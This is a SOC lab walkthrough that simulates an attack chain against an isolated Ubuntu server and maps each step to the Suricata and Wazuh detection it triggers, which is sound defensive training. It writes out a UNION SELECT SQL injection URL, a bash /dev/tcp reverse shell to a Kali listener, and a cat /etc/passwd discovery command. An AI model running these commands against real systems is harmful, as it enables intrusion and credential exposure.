# Full Attack Chain Simulation

This walkthrough demonstrates a controlled attack chain against the Ubuntu SOC server and shows how network activity is detected by Suricata and classified by Wazuh.

> **Authorization:** Run these commands only inside the isolated lab. The target IP below belongs to the lab environment.

## Target Setup

On Ubuntu-SOC-Server:

```bash
cd ~
sudo python3 -m http.server 80 --bind 10.0.2.3
```

This Python server is only a simple HTTP target. It does not actually execute SQL, PHP, or command-injection payloads; the requests are used to exercise the detection signatures.

## Stage 1 — Reconnaissance

From Kali:

```bash
nmap -sV -p 22,80 10.0.2.3
```

This identifies exposed services and versions.

## Stage 2 — Web Enumeration

```bash
curl -A "Nikto-Scanner-Test" http://10.0.2.3/
```

Detected as:

- Wazuh rule: `100001`
- Detection: `Nikto Scanner Detected`
- MITRE ATT&CK: `T1595` — Active Scanning

You can also test the Curl signature directly:

```bash
curl http://10.0.2.3/
```

Detected as Wazuh rule `100003`.

## Stage 3 — SQL Injection Detection Test

```bash
curl "http://10.0.2.3/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
```

Detected as:

- Wazuh rule: `100005`
- Detection: `SQL Injection Attempt Detected`
- MITRE ATT&CK: `T1190` — Exploit Public-Facing Application

The HTTP server does not execute the SQL statement. Suricata only observes and detects the request pattern.

## Stage 4 — Controlled Reverse-Shell Demonstration

On Kali, start a listener:

```bash
nc -lvnp 4444
```

On Ubuntu, the documented lab simulation is:

```bash
bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
```

After the shell connects, run controlled discovery commands:

```bash
id
whoami
uname -a
cat /etc/passwd
```

The detection focuses on shell output that actually crosses the network rather than the Bash-only `/dev/tcp/` string.

Detected as:

- Wazuh rule: `100015`
- Detection: `Reverse Shell Indicator - Shell Output Detected`
- MITRE ATT&CK: `T1059` — Command and Scripting Interpreter

## Dashboard Verification

In Wazuh Dashboard → **Threat Hunting → Events**, use a recent time window such as `Last 1 hour` and search for:

```text
rule.id: 100001 OR rule.id: 100003 OR rule.id: 100005 OR rule.id: 100015
```

Expected investigation sequence:

| Stage             |   Rule | Detection                      | MITRE |
| ----------------- | -----: | ------------------------------ | ----- |
| Web Enumeration   | 100001 | Nikto Scanner Detected         | T1595 |
| Reconnaissance    | 100003 | Curl Usage Detected            | T1595 |
| Exploitation Test | 100005 | SQL Injection Attempt Detected | T1190 |
| Shell Activity    | 100015 | Reverse Shell Output Detected  | T1059 |


This sequence demonstrates the core SOC workflow: generate controlled activity, collect telemetry, detect the behavior, classify it, and investigate the resulting alert.
